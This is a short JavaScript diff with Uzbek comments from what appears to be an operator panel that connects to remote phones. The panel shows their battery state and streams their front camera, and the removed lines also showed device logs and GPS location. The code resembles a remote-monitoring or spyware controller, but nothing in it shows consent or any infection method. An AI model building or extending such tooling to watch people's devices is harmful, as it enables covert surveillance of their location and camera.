@@ -165,35 +165,30 @@ function connectToDevice(id, name) {
     currentActiveCallId = id;
     document.getElementById('target-name').innerText = "Qurilma: " + name;
 
-    // 1. ZARYAD DARAJASINI KUZATISH
+    // Zaryad va Loglarni kuzatish (ishlayapti)
     db.ref('devices/' + id + '/info').on('value', s => {
         const info = s.val();
-        const display = document.getElementById('battery-display');
-        if (info && display) {
-            display.innerText = `Quvvat: ${info.battery} ${info.charging ? '(Zaryadlanmoqda)' : ''}`;
+        if (info) {
+            document.getElementById('battery-display').innerText = `Quvvat: ${info.battery} ${info.charging ? '(Zaryadlanmoqda)' : ''}`;
         }
     });
 
-    // 2. LOGLARNI KUZATISH
-    const logBox = document.getElementById('console-logs');
-    logBox.innerHTML = "";
-    db.ref('devices/' + id + '/logs').limitToLast(10).on('child_added', s => {
-        const p = document.createElement('div');
-        p.innerText = `> [${s.val().time}] ${s.val().message}`;
-        logBox.prepend(p);
-    });
-
-    // 3. GPS XARITADA KO'RSATISH
-    db.ref('devices/' + id + '/location').on('value', s => {
-        const loc = s.val();
-        if (loc) initMap(loc.lat, loc.lng);
-    });
-
-    // 4. VIDEO ULANISH (Old kamera oqimini olish)
-    const call = adminPeer.call(id, null);
-    call.on('stream', s => {
+    // VIDEO ULANISHNI TUZATISH
+    // Admin telefonga qo'ng'iroq qiladi
+    const call = adminPeer.call(id, null); 
+    
+    call.on('stream', (remoteStream) => {
         const video = document.getElementById('remoteVideo');
-        if (video) video.srcObject = s;
+        if (video) {
+            video.srcObject = remoteStream;
+            // Ba'zi brauzerlarda avtomatik ijro etish uchun:
+            video.play().catch(e => console.error("Video ijro etilmadi:", e));
+        }
+    });
+
+    // Xatoliklarni tekshirish
+    call.on('error', err => {
+        console.error("Qo'ng'iroq xatosi:", err);
     });
 }
 
